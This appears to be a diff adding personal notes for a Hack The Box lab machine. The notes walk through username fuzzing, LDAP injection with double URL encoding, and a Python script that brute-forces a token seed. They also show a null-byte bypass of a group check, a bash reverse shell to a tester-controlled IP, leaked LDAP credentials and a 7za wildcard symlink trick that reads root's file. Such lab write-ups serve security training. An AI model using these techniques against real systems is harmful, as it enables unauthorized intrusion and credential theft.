@@ -1,0 +1,561 @@
+CTF - Hack The Box - CentOS
+
+Compressed Token Format - string of digits that changes every minute when using 2 factor auth.
+LDAP Injection - one long hard problem, a lot of enumeration.
+
+
+RHEL 7: based on upstream v2.4.6
+
+http://10.10.10.122/login.php
+
+"software token linux"
+"man stoken"
+
+Commands and Output:
+===================================================================================================================================
+BASIC USAGE
+
+Use stoken import to decode a token string and write it into ~/.stokenrc. This may prompt for a device ID and/or password, depending on what options your administrator used to create the token. The token string can be provided on the command line, or read from a text file.
+
+stoken will autodetect the following types of token strings:
+
+286510182209303756117707012447003320623006...
+29658-21098-45467-64675-65731-01441-11337...
+    Pure numeric (81-digit) "ctf" (compressed token format) strings, with or without dashes. These may have been furnished as-is, or they could have been derived from an sdtid file by the RSA TokenConverter program.
+===================================================================================================================================
+
+So we go the login page and have to guess a usernmae and password, given the nature of the box and it's ip blacklisting we will have
+to use a relatively small username wordlist to bruteforce with causing muh noise.
+
+Commands and Output:
+===================================================================================================================================
+/opt/SecLists/Usernames/top-usernames-shortlist.txt
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $wfuzz -d 'inputUsername=FUZZ&inputOTP=1234' -w /opt/SecLists/Usernames/top-usernames-shortlist.txt http://10.10.10.122/login.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.122/login.php
+Total requests: 17
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+000000017:   200        68 L     233 W      2834 Ch     "azureuser"                                                              
+000000016:   200        68 L     233 W      2832 Ch     "vagrant"                                                                
+000000015:   200        68 L     233 W      2833 Ch     "ec2-user"                                                               
+000000010:   200        68 L     233 W      2831 Ch     "oracle"                                                                 
+000000011:   200        68 L     233 W      2828 Ch     "ftp"                                                                    
+000000009:   200        68 L     233 W      2838 Ch     "administrator"                                                          
+000000008:   200        68 L     233 W      2829 Ch     "user"                                                                   
+000000002:   200        68 L     233 W      2830 Ch     "admin"                                                                  
+000000004:   200        68 L     233 W      2830 Ch     "guest"                                                                  
+000000005:   200        68 L     233 W      2829 Ch     "info"                                                                   
+000000012:   200        68 L     233 W      2827 Ch     "pi"                                                                     
+000000001:   200        68 L     233 W      2829 Ch     "root"                                                                   
+000000006:   200        68 L     233 W      2828 Ch     "adm"                                                                    
+000000014:   200        68 L     233 W      2832 Ch     "ansible"                                                                
+000000007:   200        68 L     233 W      2830 Ch     "mysql"                                                                  
+000000003:   200        68 L     233 W      2829 Ch     "test"                                                                   
+000000013:   200        68 L     233 W      2831 Ch     "puppet"                                                                 
+
+Total time: 0
+Processed Requests: 17
+Filtered Requests: 0
+Requests/sec.: 0
+===================================================================================================================================
+
+None of these are valid usernames, we will fuzz a little more.
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $wfuzz --hw 233 -d 'inputUsername=FUZZ&inputOTP=1234' -w /opt/SecLists/Fuzzing/special-chars.txt http://10.10.10.122/login.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.122/login.php
+Total requests: 32
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+000000001:   200        68 L     229 W      2810 Ch     "~"                                                                      
+000000015:   200        68 L     229 W      2810 Ch     "="                                                                      
+000000020:   200        68 L     229 W      2810 Ch     "|"                                                                      
+000000021:   200        68 L     229 W      2810 Ch     "\"                                                                      
+000000014:   200        68 L     232 W      2826 Ch     "+"                                                                      
+000000011:   200        68 L     229 W      2810 Ch     ")"                                                                      
+000000010:   200        68 L     229 W      2810 Ch     "("                                                                      
+000000009:   200        68 L     229 W      2810 Ch     "*"                                                                      
+000000008:   200        68 L     232 W      2825 Ch     "&"                                                                      
+000000002:   200        68 L     229 W      2810 Ch     "!"                                                                      
+000000032:   200        68 L     229 W      2810 Ch     ">"                                                                      
+000000031:   200        68 L     229 W      2810 Ch     "<"                                                                      
+
+Total time: 0
+Processed Requests: 32
+Filtered Requests: 20
+Requests/sec.: 0
+===================================================================================================================================
+
+
+It seems special character are blacklisted. "+" and "&" seem to not be blacklisted. We will try to double encode the input to login
+What we are doing with double hex encoding is hoping that the blacklist is being applied before the application does url decoding
+and that the app does double url decode
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $wfuzz --hw 233 -d 'inputUsername=FUZZ&inputOTP=1234' -w doble-uri-hex.txt http://10.10.10.122/login.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.122/login.php
+Total requests: 256
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+000000001:   200        68 L     229 W      2810 Ch     "%2500"                                                                  
+000000042:   200        68 L     229 W      2810 Ch     "%2529"                                                                  
+000000041:   200        68 L     229 W      2810 Ch     "%2528"                                                                  
+000000043:   200        68 L     231 W      2822 Ch     "%252a"                                                                  
+000000093:   200        68 L     229 W      2810 Ch     "%255c"                                                                  
+
+Total time: 3.970187
+Processed Requests: 256
+Filtered Requests: 251
+Requests/sec.: 64.48057
+===================================================================================================================================
+
+%2500 is a null byte, %2528 is "(", %2528 is ")", %252a is "*", "%255c" is "\"
+Most of these character have to do with ldap
+
+Commands and Output:
+===================================================================================================================================
+(&
+    (username=hacker)
+    (uid=1234)
+)
+===================================================================================================================================
+
+Application barfs because it null bytes end qyeru preemptively, we can test theory by adding parantehese before null byte.
+
+Commands and Output:
+===================================================================================================================================
+POST /login.php HTTP/1.1
+Host: 10.10.10.122
+User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 57
+Origin: http://10.10.10.122
+DNT: 1
+Connection: close
+Referer: http://10.10.10.122/login.php
+Cookie: PHPSESSID=b1c1btgt21fbc5apevhauq9hl3
+Upgrade-Insecure-Requests: 1
+Sec-GPC: 1
+
+
+inputUsername=pleasesub%2529%2529%2529%2500&inputOTP=1234
+===================================================================================================================================
+
+In our response we got the username match at 3 closed parantheses our query was successful.
+Uneven number of parantheses cause query to fail.
+Commands and Output:
+===================================================================================================================================
+(&
+  (&
+    (username=hacker)
+    (uid=1234)
+  )
+  (&| #UNKOWN
+    (comparing something)A
+  )
+ )
+===================================================================================================================================
+
+"*" wildcard will give us 231 characters
+Commands and Output:
+===================================================================================================================================
+inputUsername=%252a&inputOTP=1234
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================A
+<form action="/login.php" method="post" >
+  <div class="form-group row">
+    <div class="col-sm-10">
+    Cannot login    </div>
+  </div>
+===================================================================================================================================
+
+The "cannot login" is important since it is telling us that wildcard is a valid user. We canuse this to brute force for a user by 
+appending wildcard on every postivie query until it does not give us Cannt login message.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $wfuzz --hw 233 -d 'inputUsername=FUZZ%252a&inputOTP=1234' -w char.txt http://10.10.10.122/login.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.122/login.php
+Total requests: 26
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+000000012:   200        68 L     231 W      2822 Ch     "l"
+
+
+
+We get one hit back and that is "l"
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+000000004:   200        68 L     231 W      2822 Ch     "d"                                                                      
+
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+000000001:   200        68 L     231 W      2822 Ch     "a"                                                                      
+
+
+...
+..
+..
+..
+..
+===================================================================================================================================
+
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $wfuzz --hw 233 -d 'inputUsername=ldapuserFUZZ%252a&inputOTP=1234' -w char.txt http://10.10.10.122/login.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.122/login.php
+Total requests: 26
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+
+Total time: 0
+Processed Requests: 26
+Filtered Requests: 26
+Requests/sec.: 0
+===================================================================================================================================
+
+
+We end up getting the "ldapuser" being an existing user. We can give it an ldap attributes query to retrieve more info.
+Home directories phone numbers
+
+Commands and Output:
+===================================================================================================================================
+(&
+  (&
+    (username=ldapuser)
+    (uid=1234)
+    ($attribute=*
+  )
+  (&| #UNKOWN
+    (comparing something)
+  )
+)
+===================================================================================================================================
+
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $wfuzz --hw 233 -d 'inputUsername=ldapuser%2529%2528FUZZ%253d%252a&inputOTP=1234' -w LDAP_attributes.txt http://10.10.10.122/login.php
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.10.122/login.php
+Total requests: 27
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                  
+=====================================================================
+
+000000017:   200        68 L     231 W      2822 Ch     "objectClass"                                                            
+000000015:   200        68 L     231 W      2822 Ch     "name"                                                                   
+000000013:   200        68 L     231 W      2822 Ch     "mail"                                                                   
+000000002:   200        68 L     231 W      2822 Ch     "cn"                                                                     
+000000004:   200        68 L     231 W      2822 Ch     "commonName"                                                             
+000000020:   200        68 L     231 W      2822 Ch     "pager"                                                                  
+000000022:   200        68 L     231 W      2822 Ch     "sn"                                                                     
+000000025:   200        68 L     231 W      2822 Ch     "uid"                                                                    
+000000027:   200        68 L     231 W      2822 Ch     "userPassword"                                                           
+000000024:   200        68 L     231 W      2822 Ch     "surname"                                                                
+
+Total time: 0.747026
+Processed Requests: 27
+Filtered Requests: 17
+Requests/sec.: 36.14329
+===================================================================================================================================
+
+All valid attributes are shown. We need to find the software token which is 81 digits so we will look at pager attribute
+We create a script that will automate this process for us.
+
+Commands and Output:
+===================================================================================================================================
+#!/usr/bin/python3
+import requests
+from time import sleep
+from string import digits, ascii_lowercase
+import sys
+
+#print(digits)
+#print(ascii_lowercase)
+
+url='http://10.10.10.122/login.php'
+token = ""
+attribute = "pager"
+loop=1
+
+while loop > 0 :
+    for digit in digits:
+        token=token
+        query= f'ldapuser%29%28{attribute}%3d{token}{digit}%2a'
+
+        data= {'inputUsername': query, 'inputOTP': "1234"}
+        r= requests.post(url, data=data)
+        ### Overwrites what it is printing so as to give live results
+        sys.stdout.write(f'\rToken: {token}{digit}')
+        sleep(1)
+        if 'Cannot login' in r.text:
+         #   print(f'Success: {digit}')
+           # print(f'Success: {digit}')
+            token= token + digit
+            break
+        elif digit == "9":
+            loop=0
+            break
+===================================================================================================================================
+
+The ned result of the query
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $./brute.py 
+Token: 285449490011357156531651545652335570713167411445727140604172141456711102716717000
+===================================================================================================================================
+
+We now install stoken and give it the stoken we kot from the pager attribute and give it a pin of 0000 and we get back our 
+temporary ine time use token
+
+Commands and Output:
+===================================================================================================================================A
+┌─[✗]─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000
+13686055
+===================================================================================================================================
+
+
+We enter the one time password but this seems to not work at all. So this maybe a time issue so we will make sure our time is
+synched with the machines time. We do the following to modify our time. We will have to issue the following to get it to work.
+
+Commands and Output:
+===================================================================================================================================
+┌─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $sudo timedatectl set-timezone GMT
+┌─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $sudo timedatectl set-time "03:57"
+┌─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $stoken --token=285449490011357156531651545652335570713167411445727140604172141456711102716717000 --pin=0000
+37292440
+
+#### To reset enter following
+┌─[✗]─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $sudo timedatectl set-timezone America/Los_Angeles
+===================================================================================================================================
+
+We get to another page that allows us to enter a command but we get the following message
+Commands and Output:
+===================================================================================================================================
+
+User must be member of root or adm group and have a registered token to issue commands on this server
+Cmd
+OTP
+===================================================================================================================================
+
+We are not a member of those groups. One of the things we can do is manipulate the way ldap searches for the atrributes that checks
+to see if the user is a member or not of the root or adm groups, if we stop the query from probing for more preemtively we may
+bypass the secuirty check we can do this in burp by adding a null byte to the query and the 3 closed parantheses beforehand.
+Commands and Output:
+===================================================================================================================================
+inputUsername=ldapuser%2529%2529%2529%2500&inputOTP=28892894
+===================================================================================================================================
+
+And it works we can now issue a command such as bash reverse shell to get a user shell in the box.
+Commands and Output:
+===================================================================================================================================
+bash -c 'bash -i >& /dev/tcp/10.10.14.23/443 0>&1'
+===================================================================================================================================
+
+There might be issues with ports not being allowed to go to. Use a common port to intercept netcat with. Since firewall rules might be
+in place.
+
+Commands and Output:
+===================================================================================================================================
+┌─[✗]─[user@parrot-virtual]─[~/htb/ctf]
+└──╼ $sudo nc -lnvp 443
+Ncat: Version 7.91 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.122.
+Ncat: Connection from 10.10.10.122:57562.
+bash: no job control in this shell
+bash-4.2$ 
+===================================================================================================================================
+
+Usually ldap rquires a bind which means it needs credentials to authenticate a user so we can cat the login.php and we find creds
+we can try and use them to ssh and we get in as the ldapuser
+Commands and Output:
+===================================================================================================================================
+cat login.php
+<!doctype html>
+<?php
+session_start();
+$strErrorMsg="";
+
+$username = 'ldapuser';
+$password = 'e398e27d5c4ad45086fe431120932a01';
+
+$basedn = 'dc=ctf,dc=htb';
+$usersdn = 'cn=users';
+
+// This code uses the START_TLS command
+
+$ldaphost = "ldap://ctf.htb";
+$ldapUsername  = "cn=$username";
+
+$ds = ldap_connect($ldaphost);
+$dn = "uid=ldapuser,ou=People,dc=ctf,dc=htb"; 
+===================================================================================================================================
+
+If we go to the root directory we find a non-standard directory backup.
+
+Commands and Output:
+===================================================================================================================================
+[ldapuser@ctf /]$ cd backup/
+[ldapuser@ctf backup]$ ls
+backup.1618806781.zip  backup.1618806961.zip  backup.1618807141.zip  backup.1618807321.zip  honeypot.sh
+backup.1618806841.zip  backup.1618807021.zip  backup.1618807202.zip  backup.1618807381.zip
+backup.1618806901.zip  backup.1618807081.zip  backup.1618807261.zip  error.log
+===================================================================================================================================
+
+Everything is within a minute.
+
+Commands and Output:
+===================================================================================================================================
+[ldapuser@ctf backup]$ cat honeypot.sh 
+# get banned ips from fail2ban jails and update banned.txt
+# banned ips directily via firewalld permanet rules are **not** included in the list (they get kicked for only 10 seconds)
+/usr/sbin/ipset list | grep fail2ban -A 7 | grep -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u > /var/www/html/banned.txt
+# awk '$1=$1' ORS='<br>' /var/www/html/banned.txt > /var/www/html/testfile.tmp && mv /var/www/html/testfile.tmp /var/www/html/banned.txt
+
+# some vars in order to be sure that backups are protected
+now=$(date +"%s")
+filename="backup.$now"
+pass=$(openssl passwd -1 -salt 0xEA31 -in /root/root.txt | md5sum | awk '{print $1}')
+
+# keep only last 10 backups
+cd /backup
+ls -1t *.zip | tail -n +11 | xargs rm -f
+
+# get the files from the honeypot and backup 'em all
+cd /var/www/html/uploads
+7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+
+# cleaup the honeypot
+rm -rf -- *
+
+# comment the next line to get errors for debugging
+truncate -s 0 /backup/error.log
+===================================================================================================================================
+
+The honeypot script has a way of possibly abusing the 7za command by modify the files in the uploads directory.
+The ldapuser cannot modify things in that directory but the apache user sure can.
+
+We take advanatge of the way 7zip archives files and how it tries to prevent users from maliciuosly executing code,
+however you can still access contents of files owned by root in this case the root.txt file.
+
+To bypass these measures we create a regular file with the '@' symbol and then creaste a symlink from root.txt to a regular file
+name that is the same as the previous file created except without the '@'.
+
+This is exploitable given the nature in which the command at execution expands things, for example it will output the contents of
+the symlink or the root.txt when it tries to expand all the files in the directory.
+
+Commands and Output:
+===================================================================================================================================
+bash-4.2$ touch @hello
+touch @hello
+bash-4.2$ ln -s /root/root.txt hello
+ln -s /root/root.txt hello
+bash-4.2$ ls
+ls
+@hello
+hello
+
+[ldapuser@ctf backup]$ tail -f error.log 
+WARNING: No more files
+fd6d2e53c995e6928cd0f040c79ba053
+
+tail: error.log: file truncated
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
+
+Commands and Output:
+===================================================================================================================================
+===================================================================================================================================
